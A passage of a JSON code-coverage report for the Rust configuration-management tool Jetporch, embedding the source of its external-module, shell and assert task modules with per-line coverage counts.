:368,"address":[],"length":0,"stats":{"Line":0}},{"line":370,"address":[],"length":0,"stats":{"Line":0}},{"line":372,"address":[],"length":0,"stats":{"Line":0}},{"line":375,"address":[],"length":0,"stats":{"Line":0}},{"line":376,"address":[],"length":0,"stats":{"Line":0}},{"line":377,"address":[],"length":0,"stats":{"Line":0}},{"line":379,"address":[],"length":0,"stats":{"Line":0}},{"line":380,"address":[],"length":0,"stats":{"Line":0}},{"line":381,"address":[],"length":0,"stats":{"Line":0}},{"line":383,"address":[],"length":0,"stats":{"Line":0}}],"covered":3,"coverable":178},{"path":["/","Users","wings","projects","jetpack","src","modules","commands","external.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse crate::tasks::*;\nuse crate::handle::handle::TaskHandle;\nuse serde::{Deserialize};\nuse std::sync::{Arc,RwLock};\nuse serde_json;\nuse std::path::PathBuf;\nuse crate::inventory::hosts::Host;\n\nconst MODULE: \u0026str = \"External\";\n\n#[derive(Deserialize,Debug)]\n#[serde(deny_unknown_fields)]\npub struct ExternalTask {\n    pub name: Option\u003cString\u003e,\n    #[serde(rename = \"use\")]\n    pub use_module: String,\n    pub params: serde_json::Map\u003cString, serde_json::Value\u003e,\n    pub save: Option\u003cString\u003e, \n    pub failed_when: Option\u003cString\u003e, \n    pub changed_when: Option\u003cString\u003e, \n    pub with: Option\u003cPreLogicInput\u003e,\n    pub and: Option\u003cPostLogicInput\u003e,\n}\nstruct ExternalAction {\n    pub use_module: PathBuf,\n    pub params: String,\n    pub save: Option\u003cString\u003e, \n    pub failed_when: Option\u003cString\u003e,\n    pub changed_when: Option\u003cString\u003e,\n}\n\n\nimpl IsTask for ExternalTask {\n\n    fn get_module(\u0026self) -\u003e String { String::from(MODULE) }\n    fn get_name(\u0026self) -\u003e Option\u003cString\u003e { self.name.clone() }\n    fn get_with(\u0026self) -\u003e Option\u003cPreLogicInput\u003e { self.with.clone() }\n\n    fn evaluate(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode) -\u003e Result\u003cEvaluatedTask, Arc\u003cTaskResponse\u003e\u003e {\n        return Ok(\n            EvaluatedTask {\n                action: Arc::new(ExternalAction {\n                    use_module: handle.template.find_module_path(request, tm, \u0026String::from(\"use\"), \u0026self.use_module)?,\n                    // FIXME: template the parameters\n                    params: {\n                        let params_data = match serde_json::to_string(\u0026self.params) {\n                            Ok(x) =\u003e x,\n                            Err(_y) =\u003e {\n                                return Err(handle.response.is_failed(request,  \u0026String::from(\"unable to load JSON inputs\")));\n                            }\n                        };\n                        // note: this level of templating occurs at runtime and we would /like/ to do it earlier.\n                        match handle.template.string_unsafe_for_shell(request, TemplateMode::Strict, \u0026String::from(\"params\"), \u0026params_data) {\n                            Ok(x) =\u003e x,\n                            Err(y) =\u003e {\n                                return Err(handle.response.is_failed(request, \u0026format!(\"unable to template parameters: {:?}\",y)));\n                            }\n                        }\n                    },\n                    save: handle.template.string_option_no_spaces(\u0026request, tm, \u0026String::from(\"save\"), \u0026self.save)?,\n                    failed_when: handle.template.string_option_unsafe_for_shell(\u0026request, tm, \u0026String::from(\"failed_when\"), \u0026self.failed_when)?,\n                    changed_when: handle.template.string_option_unsafe_for_shell(\u0026request, tm, \u0026String::from(\"changed_when\"), \u0026self.changed_when)?,\n                }),\n                with: Arc::new(PreLogicInput::template(\u0026handle, \u0026request, tm, \u0026self.with)?),\n                and: Arc::new(PostLogicInput::template(\u0026handle, \u0026request, tm, \u0026self.and)?),\n            }\n        );\n    }\n\n}\n\nimpl IsAction for ExternalAction {\n    \n    fn dispatch(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e, Arc\u003cTaskResponse\u003e\u003e {\n    \n        match request.request_type {\n\n            TaskRequestType::Query =\u003e {\n                return Ok(handle.response.needs_execution(\u0026request));\n            },\n\n            TaskRequestType::Execute =\u003e {\n\n                let (_tmp_path1, tmp_file1) = handle.remote.get_transfer_location(request)?;\n                let (_tmp_path2, tmp_file2) = handle.remote.get_transfer_location(request)?;\n\n                let module_tmp_file = tmp_file1.as_ref().unwrap();\n                let param_tmp_file = tmp_file2.as_ref().unwrap();\n                let module_str_path = module_tmp_file.as_path().display().to_string();\n                let param_str_path = param_tmp_file.as_path().display().to_string();\n\n                handle.remote.copy_file(request, self.use_module.as_path(), \u0026module_str_path.clone(), |_f| { \n                    return Ok(()) \n                })?;\n                \n                handle.remote.write_data(request, \u0026self.params.clone(), \u0026param_str_path.clone(), |_f| {\n                    // not using the after save handler for this module\n                    return Ok(());\n                })?;\n                \n                let chmod = format!(\"chmod +x '{}'\", module_str_path.clone());\n                handle.remote.run(request, \u0026chmod, CheckRc::Checked)?;\n\n                let module_run = format!(\"{} \u003c {}\", module_str_path.clone(), param_str_path.clone());\n                let task_result = handle.remote.run_unsafe(request, \u0026module_run, CheckRc::Checked)?;\n                let (rc, out) = cmd_info(\u0026task_result);\n\n                handle.remote.delete_file(request, \u0026param_str_path.clone())?;\n                handle.remote.delete_file(request, \u0026module_str_path.clone())?;\n\n                let map_data = build_results_map(handle, request, rc, \u0026out)?;\n\n                let should_fail = match self.failed_when.is_none() {\n                    true =\u003e match rc { 0 =\u003e false, _ =\u003e true },\n                    false =\u003e {\n                        let condition = self.failed_when.as_ref().unwrap();\n                        handle.template.test_condition_with_extra_data(request, TemplateMode::Strict, condition, \u0026handle.host, map_data.clone())?\n                    }\n                };\n\n                let should_mark_changed = match self.changed_when.is_none() {\n                    true =\u003e true,\n                    false =\u003e {\n                        let condition = self.changed_when.as_ref().unwrap();\n                        handle.template.test_condition_with_extra_data(request, TemplateMode::Strict, condition, \u0026handle.host, map_data.clone())?\n                    }\n                };\n\n                if self.save.is_some() {\n                    save_results(\u0026handle.host, self.save.as_ref().unwrap(), map_data);\n                }\n\n                return match should_fail {\n                    true =\u003e Err(handle.response.command_failed(request, \u0026Arc::clone(\u0026task_result.command_result))),\n                    false =\u003e match should_mark_changed {\n                        true =\u003e Ok(task_result),\n                        false =\u003e Ok(handle.response.is_passive(request))\n                    }\n                };\n                \n            },\n    \n            _ =\u003e { return Err(handle.response.not_supported(\u0026request)); }\n    \n        }\n    }\n\n}\n\nfn build_results_map(handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e, rc: i32, out: \u0026String) -\u003e Result\u003cserde_yaml::Mapping, Arc\u003cTaskResponse\u003e\u003e {\n    let mut result = serde_yaml::Mapping::new();\n    let data : serde_yaml::Value = match serde_yaml::from_str(out) {\n        Ok(x) =\u003e x,\n        Err(_y) =\u003e { return Err(handle.response.is_failed(request, \u0026format!(\"failed to parse external module response: {}\", out))) },\n    };\n    result.insert(serde_yaml::Value::String(String::from(\"rc\")), rc.into());\n    match data {\n        serde_yaml::Value::Mapping(data_map) =\u003e {\n            for (k,v) in data_map.iter() {\n                result.insert(k.clone(), v.clone());\n            }\n        },\n        _ =\u003e {\n            return Err(handle.response.is_failed(request, \u0026format!(\"response should be a map: {}\", out)));\n        }\n    }\n    return Ok(result);\n}\n\nfn save_results(host: \u0026Arc\u003cRwLock\u003cHost\u003e\u003e, key: \u0026String, map_data: serde_yaml::Mapping) {\n    let mut result = serde_yaml::Mapping::new();\n    result.insert(serde_yaml::Value::String(key.clone()), serde_yaml::Value::Mapping(map_data.clone()));\n    host.write().unwrap().update_variables(result);\n}\n\n","traces":[{"line":51,"address":[],"length":0,"stats":{"Line":0}},{"line":52,"address":[],"length":0,"stats":{"Line":0}},{"line":53,"address":[],"length":0,"stats":{"Line":0}},{"line":55,"address":[],"length":0,"stats":{"Line":0}},{"line":56,"address":[],"length":0,"stats":{"Line":0}},{"line":57,"address":[],"length":0,"stats":{"Line":0}},{"line":58,"address":[],"length":0,"stats":{"Line":0}},{"line":59,"address":[],"length":0,"stats":{"Line":0}},{"line":62,"address":[],"length":0,"stats":{"Line":0}},{"line":63,"address":[],"length":0,"stats":{"Line":0}},{"line":64,"address":[],"length":0,"stats":{"Line":0}},{"line":65,"address":[],"length":0,"stats":{"Line":0}},{"line":69,"address":[],"length":0,"stats":{"Line":0}},{"line":70,"address":[],"length":0,"stats":{"Line":0}},{"line":71,"address":[],"length":0,"stats":{"Line":0}},{"line":72,"address":[],"length":0,"stats":{"Line":0}},{"line":76,"address":[],"length":0,"stats":{"Line":0}},{"line":77,"address":[],"length":0,"stats":{"Line":0}},{"line":78,"address":[],"length":0,"stats":{"Line":0}},{"line":80,"address":[],"length":0,"stats":{"Line":0}},{"line":81,"address":[],"length":0,"stats":{"Line":0}},{"line":90,"address":[],"length":0,"stats":{"Line":0}},{"line":92,"address":[],"length":0,"stats":{"Line":0}},{"line":95,"address":[],"length":0,"stats":{"Line":0}},{"line":100,"address":[],"length":0,"stats":{"Line":0}},{"line":101,"address":[],"length":0,"stats":{"Line":0}},{"line":103,"address":[],"length":0,"stats":{"Line":0}},{"line":104,"address":[],"length":0,"stats":{"Line":0}},{"line":105,"address":[],"length":0,"stats":{"Line":0}},{"line":106,"address":[],"length":0,"stats":{"Line":0}},{"line":108,"address":[],"length":0,"stats":{"Line":0}},{"line":109,"address":[],"length":0,"stats":{"Line":0}},{"line":112,"address":[],"length":0,"stats":{"Line":0}},{"line":114,"address":[],"length":0,"stats":{"Line":0}},{"line":117,"address":[],"length":0,"stats":{"Line":0}},{"line":118,"address":[],"length":0,"stats":{"Line":0}},{"line":120,"address":[],"length":0,"stats":{"Line":0}},{"line":121,"address":[],"length":0,"stats":{"Line":0}},{"line":122,"address":[],"length":0,"stats":{"Line":0}},{"line":124,"address":[],"length":0,"stats":{"Line":0}},{"line":125,"address":[],"length":0,"stats":{"Line":0}},{"line":127,"address":[],"length":0,"stats":{"Line":0}},{"line":129,"address":[],"length":0,"stats":{"Line":0}},{"line":130,"address":[],"length":0,"stats":{"Line":0}},{"line":132,"address":[],"length":0,"stats":{"Line":0}},{"line":133,"address":[],"length":0,"stats":{"Line":0}},{"line":137,"address":[],"length":0,"stats":{"Line":0}},{"line":138,"address":[],"length":0,"stats":{"Line":0}},{"line":140,"address":[],"length":0,"stats":{"Line":0}},{"line":141,"address":[],"length":0,"stats":{"Line":0}},{"line":145,"address":[],"length":0,"stats":{"Line":0}},{"line":146,"address":[],"length":0,"stats":{"Line":0}},{"line":149,"address":[],"length":0,"stats":{"Line":0}},{"line":150,"address":[],"length":0,"stats":{"Line":0}},{"line":151,"address":[],"length":0,"stats":{"Line":0}},{"line":152,"address":[],"length":0,"stats":{"Line":0}},{"line":153,"address":[],"length":0,"stats":{"Line":0}},{"line":159,"address":[],"length":0,"stats":{"Line":0}},{"line":166,"address":[],"length":0,"stats":{"Line":0}},{"line":167,"address":[],"length":0,"stats":{"Line":0}},{"line":168,"address":[],"length":0,"stats":{"Line":0}},{"line":169,"address":[],"length":0,"stats":{"Line":0}},{"line":170,"address":[],"length":0,"stats":{"Line":0}},{"line":172,"address":[],"length":0,"stats":{"Line":0}},{"line":173,"address":[],"length":0,"stats":{"Line":0}},{"line":174,"address":[],"length":0,"stats":{"Line":0}},{"line":175,"address":[],"length":0,"stats":{"Line":0}},{"line":176,"address":[],"length":0,"stats":{"Line":0}},{"line":180,"address":[],"length":0,"stats":{"Line":0}},{"line":183,"address":[],"length":0,"stats":{"Line":0}},{"line":186,"address":[],"length":0,"stats":{"Line":0}},{"line":187,"address":[],"length":0,"stats":{"Line":0}},{"line":188,"address":[],"length":0,"stats":{"Line":0}},{"line":189,"address":[],"length":0,"stats":{"Line":0}}],"covered":0,"coverable":74},{"path":["/","Users","wings","projects","jetpack","src","modules","commands","mod.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\n/** ADD MODULES HERE, KEEP ALPHABETIZED **/\n\npub mod external;\npub mod shell;\n","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","src","modules","commands","shell.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse crate::tasks::*;\nuse crate::handle::handle::TaskHandle;\nuse crate::connection::command::cmd_info;\nuse serde::{Deserialize};\nuse std::sync::{Arc,RwLock};\nuse crate::inventory::hosts::Host;\n\nconst MODULE: \u0026str = \"Shell\";\n\n#[derive(Deserialize,Debug)]\n#[serde(deny_unknown_fields)]\npub struct ShellTask {\n    pub name: Option\u003cString\u003e,\n    pub cmd: String,\n    pub save: Option\u003cString\u003e, \n    pub failed_when: Option\u003cString\u003e, \n    pub changed_when: Option\u003cString\u003e, \n    #[serde(rename = \"unsafe\")]\n    pub unsafe_: Option\u003cString\u003e, /* FIXME: can use r#unsafe instead */\n    pub with: Option\u003cPreLogicInput\u003e,\n    pub and: Option\u003cPostLogicInput\u003e,\n}\nstruct ShellAction {\n    pub cmd: String,\n    pub save: Option\u003cString\u003e, \n    pub failed_when: Option\u003cString\u003e,\n    pub changed_when: Option\u003cString\u003e,\n    pub unsafe_: bool,\n}\n\n\nimpl IsTask for ShellTask {\n\n    fn get_module(\u0026self) -\u003e String { String::from(MODULE) }\n    fn get_name(\u0026self) -\u003e Option\u003cString\u003e { self.name.clone() }\n    fn get_with(\u0026self) -\u003e Option\u003cPreLogicInput\u003e { self.with.clone() }\n\n    fn evaluate(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode) -\u003e Result\u003cEvaluatedTask, Arc\u003cTaskResponse\u003e\u003e {\n        return Ok(\n            EvaluatedTask {\n                action: Arc::new(ShellAction {\n                    unsafe_:  {\n                        if self.cmd.find(\"{{\").is_none() {\n                            // allow all the fancy shell characters unless variables are used, in which case\n                            // do a bit of extra filtering unless users turn it off.\n                            true\n                        } else {\n                            handle.template.boolean_option_default_false(\u0026request, tm, \u0026String::from(\"unsafe\"), \u0026self.unsafe_)?\n                        }\n                    },\n                    cmd:  handle.template.string_unsafe_for_shell(\u0026request, tm, \u0026String::from(\"cmd\"), \u0026self.cmd)?,\n                    save: handle.template.string_option_no_spaces(\u0026request, tm, \u0026String::from(\"save\"), \u0026self.save)?,\n                    failed_when: handle.template.string_option_unsafe_for_shell(\u0026request, tm, \u0026String::from(\"failed_when\"), \u0026self.failed_when)?,\n                    changed_when: handle.template.string_option_unsafe_for_shell(\u0026request, tm, \u0026String::from(\"changed_when\"), \u0026self.changed_when)?,\n\n                }),\n                with: Arc::new(PreLogicInput::template(\u0026handle, \u0026request, tm, \u0026self.with)?),\n                and: Arc::new(PostLogicInput::template(\u0026handle, \u0026request, tm, \u0026self.and)?),\n            }\n        );\n    }\n\n}\n\nimpl IsAction for ShellAction {\n    \n    fn dispatch(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e, Arc\u003cTaskResponse\u003e\u003e {\n    \n        match request.request_type {\n\n            TaskRequestType::Query =\u003e {\n                return Ok(handle.response.needs_execution(\u0026request));\n            },\n\n            TaskRequestType::Execute =\u003e {\n                let task_result : Arc\u003cTaskResponse\u003e;\n                if self.unsafe_ {\n                    task_result = handle.remote.run_unsafe(\u0026request, \u0026self.cmd.clone(), CheckRc::Unchecked)?;\n                } else {\n                    task_result = handle.remote.run(\u0026request, \u0026self.cmd.clone(), CheckRc::Unchecked)?;\n                }\n                let (rc, out) = cmd_info(\u0026task_result);\n                let map_data = build_results_map(rc, \u0026out);\n\n                let should_fail = match self.failed_when.is_none() {\n                    true =\u003e match rc { 0 =\u003e false, _ =\u003e true },\n                    false =\u003e {\n                        let condition = self.failed_when.as_ref().unwrap();\n                        handle.template.test_condition_with_extra_data(request, TemplateMode::Strict, condition, \u0026handle.host, map_data.clone())?\n                    }\n                };\n\n                let should_mark_changed = match self.changed_when.is_none() {\n                    true =\u003e true,\n                    false =\u003e {\n                        let condition = self.changed_when.as_ref().unwrap();\n                        handle.template.test_condition_with_extra_data(request, TemplateMode::Strict, condition, \u0026handle.host, map_data.clone())?\n                    }\n                };\n\n                if self.save.is_some() {\n                    save_results(\u0026handle.host, self.save.as_ref().unwrap(), map_data);\n                }\n\n                return match should_fail {\n                    true =\u003e Err(handle.response.command_failed(request, \u0026Arc::clone(\u0026task_result.command_result))),\n                    false =\u003e match should_mark_changed {\n                        true =\u003e Ok(task_result),\n                        false =\u003e Ok(handle.response.is_passive(request))\n                    }\n                };\n\n            },\n    \n            _ =\u003e { return Err(handle.response.not_supported(\u0026request)); }\n    \n        }\n    }\n\n}\n\nfn build_results_map(rc: i32, out: \u0026String) -\u003e serde_yaml::Mapping {\n    let mut result = serde_yaml::Mapping::new();\n    let num : serde_yaml::Value = serde_yaml::from_str(\u0026format!(\"{}\", rc)).unwrap();\n    result.insert(serde_yaml::Value::String(String::from(\"rc\")), num);\n    //result.insert(serde_yaml::Value::String(String::from(\"rc\")),  serde_yaml::Value::String(format!(\"{}\", rc)));\n\n    result.insert(serde_yaml::Value::String(String::from(\"out\")), serde_yaml::Value::String(out.clone()));\n    return result;\n}\n\nfn save_results(host: \u0026Arc\u003cRwLock\u003cHost\u003e\u003e, key: \u0026String, map_data: serde_yaml::Mapping) {\n    let mut result = serde_yaml::Mapping::new();\n    result.insert(serde_yaml::Value::String(key.clone()), serde_yaml::Value::Mapping(map_data.clone()));\n    host.write().unwrap().update_variables(result);\n}","traces":[{"line":50,"address":[],"length":0,"stats":{"Line":2}},{"line":51,"address":[],"length":0,"stats":{"Line":1}},{"line":52,"address":[],"length":0,"stats":{"Line":1}},{"line":54,"address":[],"length":0,"stats":{"Line":0}},{"line":55,"address":[],"length":0,"stats":{"Line":0}},{"line":56,"address":[],"length":0,"stats":{"Line":0}},{"line":57,"address":[],"length":0,"stats":{"Line":0}},{"line":58,"address":[],"length":0,"stats":{"Line":0}},{"line":59,"address":[],"length":0,"stats":{"Line":0}},{"line":62,"address":[],"length":0,"stats":{"Line":0}},{"line":64,"address":[],"length":0,"stats":{"Line":0}},{"line":67,"address":[],"length":0,"stats":{"Line":0}},{"line":68,"address":[],"length":0,"stats":{"Line":0}},{"line":69,"address":[],"length":0,"stats":{"Line":0}},{"line":70,"address":[],"length":0,"stats":{"Line":0}},{"line":73,"address":[],"length":0,"stats":{"Line":0}},{"line":74,"address":[],"length":0,"stats":{"Line":0}},{"line":83,"address":[],"length":0,"stats":{"Line":0}},{"line":85,"address":[],"length":0,"stats":{"Line":0}},{"line":88,"address":[],"length":0,"stats":{"Line":0}},{"line":93,"address":[],"length":0,"stats":{"Line":0}},{"line":94,"address":[],"length":0,"stats":{"Line":0}},{"line":96,"address":[],"length":0,"stats":{"Line":0}},{"line":98,"address":[],"length":0,"stats":{"Line":0}},{"line":99,"address":[],"length":0,"stats":{"Line":0}},{"line":101,"address":[],"length":0,"stats":{"Line":0}},{"line":102,"address":[],"length":0,"stats":{"Line":0}},{"line":104,"address":[],"length":0,"stats":{"Line":0}},{"line":105,"address":[],"length":0,"stats":{"Line":0}},{"line":109,"address":[],"length":0,"stats":{"Line":0}},{"line":110,"address":[],"length":0,"stats":{"Line":0}},{"line":112,"address":[],"length":0,"stats":{"Line":0}},{"line":113,"address":[],"length":0,"stats":{"Line":0}},{"line":117,"address":[],"length":0,"stats":{"Line":0}},{"line":118,"address":[],"length":0,"stats":{"Line":0}},{"line":121,"address":[],"length":0,"stats":{"Line":0}},{"line":122,"address":[],"length":0,"stats":{"Line":0}},{"line":123,"address":[],"length":0,"stats":{"Line":0}},{"line":124,"address":[],"length":0,"stats":{"Line":0}},{"line":125,"address":[],"length":0,"stats":{"Line":0}},{"line":131,"address":[],"length":0,"stats":{"Line":0}},{"line":138,"address":[],"length":0,"stats":{"Line":0}},{"line":139,"address":[],"length":0,"stats":{"Line":0}},{"line":140,"address":[],"length":0,"stats":{"Line":0}},{"line":141,"address":[],"length":0,"stats":{"Line":0}},{"line":144,"address":[],"length":0,"stats":{"Line":0}},{"line":145,"address":[],"length":0,"stats":{"Line":0}},{"line":148,"address":[],"length":0,"stats":{"Line":0}},{"line":149,"address":[],"length":0,"stats":{"Line":0}},{"line":150,"address":[],"length":0,"stats":{"Line":0}},{"line":151,"address":[],"length":0,"stats":{"Line":0}}],"covered":3,"coverable":51},{"path":["/","Users","wings","projects","jetpack","src","modules","control","assert.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse crate::tasks::*;\nuse crate::handle::handle::TaskHandle;\nuse serde::Deserialize;\nuse std::sync::Arc;\n\nconst MODULE: \u0026str = \"assert\";\n\n#[derive(Deserialize,Debug)]\n#[serde(deny_unknown_fields)]\npub struct AssertTask {\n    pub name: Option\u003cString\u003e,\n    pub msg: Option\u003cString\u003e,\n    pub r#true: Option\u003cString\u003e,\n    pub r#false: Option\u003cString\u003e,\n    pub all_true: Option\u003cVec\u003cString\u003e\u003e,\n    pub all_false: Option\u003cVec\u003cString\u003e\u003e,\n    pub some_true: Option\u003cVec\u003cString\u003e\u003e,\n    pub with: Option\u003cPreLogicInput\u003e,\n    pub and: Option\u003cPostLogicInput\u003e\n}\n\n#[allow(dead_code)]\nstruct AssertAction {\n    pub name: String,\n    pub msg: Option\u003cString\u003e,\n    pub r#true: bool,\n    pub r#false: bool,\n    pub all_true: Vec\u003cbool\u003e,\n    pub all_false: Vec\u003cbool\u003e,\n    pub some_true: Vec\u003cbool\u003e\n\n}\n\nimpl IsTask for AssertTask {\n\n    fn get_module(\u0026self) -\u003e String { String::from(MODULE) }\n    fn get_name(\u0026self) -\u003e Option\u003cString\u003e { self.name.clone() }\n    fn get_with(\u0026self) -\u003e Option\u003cPreLogicInput\u003e { self.with.clone() }\n\n    fn evaluate(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode) -\u003e Result\u003cEvaluatedTask, Arc\u003cTaskResponse\u003e\u003e {\n        return Ok(\n            EvaluatedTask {\n                action: Arc::new(AssertAction {\n                    name: self.name.clone().unwrap_or(String::from(MODULE)),\n                    msg: handle.template.string_option_unsafe_for_shell(request, tm, \u0026String::from(\"msg\"), \u0026self.msg)?,\n                    r#true: match self.r#true.is_some() {\n                            true =\u003e handle.template.test_condition(request, tm, \u0026self.r#true.as_ref().unwrap())?,\n                            false =\u003e true\n                    },\n                    r#false: match self.r#false.is_some() {\n                            true =\u003e handle.template.test_condition(request, tm, \u0026self.r#false.as_ref().unwrap())?,\n                            false =\u003e false\n                    },\n                    all_true: match self.all_true.is_some() {\n                        true =\u003e eval_list(handle, request, tm, self.all_true.as_ref().unwrap())?,\n                        false =\u003e vec![true]\n                    },\n                    all_false: match self.all_false.is_some() {\n                        true =\u003e eval_list(handle, request, tm, self.all_false.as_ref().unwrap())?,\n                        false =\u003e vec![false]\n                    },\n                    some_true: match self.some_true.is_some() {\n                        true =\u003e eval_list(handle, request, tm, self.some_true.as_ref().unwrap())?,\n                        false =\u003e vec![true]\n                    }\n                }),\n                with: Arc::new(PreLogicInput::template(handle, request, tm, \u0026self.with)?),\n                and: Arc::new(PostLogicInput::template(handle, request, tm, \u0026self.and)?),\n            }\n        );\n    }\n}\n\nfn eval_list(handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode, list: \u0026Vec\u003cString\u003e) -\u003e Result\u003cVec\u003cbool\u003e,Arc\u003cTaskResponse\u003e\u003e {\n    let mut results : Vec\u003cbool\u003e = Vec::new();\n    for item in list.iter() {\n        results.push(handle.template.test_condition(request, tm, item)?);\n    }\n    return Ok(results);\n}\n\nimpl IsAction for AssertAction {\n\n    fn dispatch(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e, Arc\u003cTaskResponse\u003e\u003e {\n\n        match request.request_type {\n\n            TaskRequestType::Query =\u003e {\n                return Ok(handle.response.needs_passive(request));\n            },\n\n            TaskRequestType::Passive =\u003e {\n                let mut fail = false;\n                if self.r#true == false {\n                    fail = true;\n                }\n                else if self.r#false == true {\n                    fail = true; \n                }\n                else if self.all_true.contains(\u0026false) {\n                    fail = true;\n                }\n                else if self.all_false.contains(\u0026true) {\n                    fail = true;\n                } \n                else if ! self.some_true.contains(\u0026true) {\n                    fail = true;\n                }\n                if fail {\n                    if self.msg.is_some() {\n                        return Err(handle.response.is_failed(request, \u0026format!(\"assertion failed: {}\", self.msg.as_ref().unwrap())));\n                    } else {\n                        return Err(handle.response.is_failed(request, \u0026format!(\"assertion failed\")));\n                    }\n                }\n                return Ok(handle.response.is_passive(request));\n            },\n\n            _ =\u003e { return Err(handle.response.not_supported(request)); }\n\n        }\n\n    }\n\n}","traces":[{"line":52,"address":[],"length":0,"stats":{"Line":2}},{"line":53,"address":[],"length":0,"stats":{"Line":1}},{"line":54,"address":[],"length":0,"stats":{"Line":1}},{"line":56,"address":[],"length":0,"stats":{"Line":0}},{"line":57,"address":[],"length":0,"stats":{"Line":0}},{"line":58,"address":[],"length":0,"stats":{"Line":0}},{"line":59,"address":[],"length":0,"stats":{"Line":0}},{"line":60,"address":[],"length":0,"stats":{"Line":0}},{"line":61,"address":[],"length":0,"stats":{"Line":0}},{"line":62,"address":[],"length":0,"stats":{"Line":0}},{"line":63,"address":[],"length":0,"stats":{"Line":0}},{"line":64,"address":[],"length":0,"stats":{"Line":0}},{"line":66,"address":[],"length":0,"stats":{"Line":0}},{"line":67,"address":[],"length":0,"stats":{"Line":0}},{"line":68,"address":[],"length":0,"stats":{"Line":0}},{"line":70,"address":[],"length":0,"stats":{"Line":0}},{"line":71,"address":[],"length":0,"stats":{"Line":0}},{"line":72,"address":[],"length":0,"stats":{"Line":0}},{"line":74,"address":[],"length":0,"stats":{"Line":0}},{"line":75,"address":[],"length":0,"stats":{"Line":0}},{"line":76,"address":[],"length":0,"stats":{"Line":0}},{"line":78,"address":[],"length":0,"stats":{"Line":0}},{"line":79,"address":[],"length":0,"stats":{"Line":0}},{"line":80,"address":[],"length":0,"stats":{"Line":0}},{"line":83,"address":[],"length":0,"stats":{"Line":0}},{"line":84,"address":[],"length":0,"stats":{"Line":0}},{"line":90,"address":[],"length":0,"stats":{"Line":0}},{"line":91,"address":[],"length":0,"stats":{"Line":0}},{"line":92,"address":[],"length":0,"stats":{"Line":0}},{"line":93,"address":[],"length":0,"stats":{"Line":0}},{"line":95,"address":[],"length":0,"stats":{"Line":0}},{"line":100,"address":[],"length":0,"stats":{"Line":0}},{"line":102,"address":[],"length":0,"stats":{"Line":0}},{"line":105,"address":[],"length":0,"stats":{"Line":0}},{"line":109,"address":[],"length":0,"stats":{"Line":0}},{"line":110,"address":[],"length":0,"stats":{"Line":0}},{"line":111,"address":[],"length":0,"stats":{"Line":0}},{"line":113,"address":[],"length":0,"stats":{"Line":0}},{"line":114,"address":[],"length":0,"stats":{"Line":0}},{"line":116,"address":[],"length":0,"stats":{"Line":0}},{"line":117,"address":[],"length":0,"stats":{"Line":0}},{"line":119,"address":[],"length":0,"stats":{"Line":0}},{"line":120,"address":[],"length":0,"stats":{"Line":0}},{"line":122,"address":[],"length":0,"stats":{"Line":0}},{"line":123,"address":[],"length":0,"stats":{"Line":0}},{"line":125,"address":[],"length":0,"stats":{"Line":0}},{"line":126,"address":[],"length":0,"stats":{"Line":0}},{"line":127,"address":[],"length":0,"stats":{"Line":0}},{"line":129,"address":[],"length":0,"stats":{"Line":0}},{"line":132,"address":[],"length":0,"stats":{"Line":0}},{"line":135,"address":[],"le